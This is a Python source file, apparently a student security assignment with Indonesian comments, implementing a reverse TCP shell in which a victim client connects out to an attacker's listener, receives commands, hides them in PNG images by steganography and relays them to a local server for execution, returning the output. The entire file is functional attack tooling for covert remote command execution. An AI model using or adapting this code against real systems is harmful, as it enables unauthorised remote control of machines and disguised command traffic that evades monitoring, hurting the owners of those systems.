# 2301894155 - Valentino Nooril
import socket
from getopt import getopt
import sys
from threading import Thread
from main import server
import steganoImage

IP = ""
PORT = 0
LISTENER  = False # True = attacker, False = victim/client

# python reversetcp.py -i 127.0.0.1 -p 12345 -l

# check alamat ip apakah benar IPv4
def check_ip(ip):
    try:
        socket.inet_pton(socket.AF_INET, ip)
        return True
    except:
        return False

# fungsi untuk mengirim command sebagai attacker
def attacker_send_command(connect):
    while True:
        try:
            message = input()
            if message == "exit":
                connect.send("exit".encode())
                connect.close()
                break
            elif message == "":
                print("cannot send empty command!")
                continue
            connect.send(message.encode())
        except Exception:
            break
    pass

# fungsi untuk menerima response sebagai attacker
def attacker_recv_command(connect):
    while True:
        try:
            response = connect.recv(2048)
            if response != b'':
                response = response.decode()
                if response[1:3] == ":\\":
                    print(f'Current Path: {response}', end="\n> ")
                else:
                    print(f'Response: {response}')
        except:
            break
    pass

# fungsi untuk menjalankan threading sebagai attacker
def attacker_thread(connect):
    send_thread = Thread(target=attacker_send_command, args = (connect,))
    recv_thread = Thread(target=attacker_recv_command, args = (connect,))

    send_thread.start()
    recv_thread.start()

    send_thread.join()
    recv_thread.join()

# fungsi yang akan dijalankan dengan option -l atau --listener
# fungsi ini akan melakukan listen pada ip dan port yang sudah ditentukan
def attacker():
    attacker_socket = socket.socket()

    attacker_socket.bind((IP, PORT))
    attacker_socket.listen(1)
    print("Listening now...")
    client_connect, (ip, port) = attacker_socket.accept()
    print(f"Connected with client on {ip}:{port}")

    attacker_thread(client_connect)

    attacker_socket.close()
    client_connect.close()
    print("Connection closed!")
    pass

# fungsi yang akan dijalankan tanpa option -l atau listener
# fungsi ini tidak dapat menerima input karena sesuai scenario, client hanya perlu mengeksekusi script saja
# attacker dapat mengirim command melalui client lalu client akan encode command ke dalam gambar
# gambar tersebut kemudian dikirim ke server untuk dieksekusi
def client_response(connect, server_connect):
    while True:
        try:
            path = server_connect.recv(2048)
            path = path.decode()
            connect.send((path).encode())
            # terima dari attacker langsung kirim ke server
            command = connect.recv(2048).decode()
            if command != b'exit':
                image = steganoImage.encode("gambar.png", "client_gambar.png", command)
                server_connect.send("SEND".encode())
                print("Sending image to server")
                with open ("client_gambar.png", "rb") as f:
                    while True:
                        content = f.read(2048)
                        if content == b'':
                            server_connect.send("#end".encode())
                            break
                        server_connect.send(content)
                    f.close()
                print("Receive response form server")
                response = server_connect.recv(2048)
                print("Sending response to client")
                connect.send(response)
            elif command == b'exit':
                server_connect.send("exit".encode())
                break
        except Exception:
            break

# fungsi untuk menjalankan threading sebagai client
def client_connect(client_socket, server_socket):
    client_thread = Thread(target=client_response,args=(client_socket,server_socket,))
    client_thread.start()
    client_thread.join()
    pass

# fungsi untuk menghubungkan client dengan attacker dan server
def client():
    client_socket = socket.socket()
    server_socket = socket.socket()
    try:
        client_socket.connect((IP, PORT))
        server_socket.connect(("127.0.0.1", 54321))
        print(f"Client connected on {IP}:{PORT}")
        print(f"Server connected on 127.0.0.1:54321")
        # bikin threading untuk client_socket dan server_socket
        client_connect(client_socket, server_socket)
    except:
        return
    client_socket.close()
    server_socket.close()
    print("Connection closed!")
    pass

def process():
    if LISTENER:
        attacker()
    else:
        client()

def main():
    global IP, PORT, LISTENER
    opts, _ = getopt(sys.argv[1:], "i:p:l", ["ip=", "port=", "listener"])

    for key, value in opts:
        if key in ["-i", "--ip"]:
            IP  = value
        if key in ["-p", "--port"]:
            PORT = int(value)
        if key in ["-l", "--listener"]:
            LISTENER = True

    if check_ip(IP) and PORT >= 0 and PORT <= 65535:
        process()
    else:
        print("Invalid argument(s)")
    # print(f"IP: {IP}, PORT: {PORT}, LISTENER: {LISTENER}")

if __name__ == "__main__":
    main()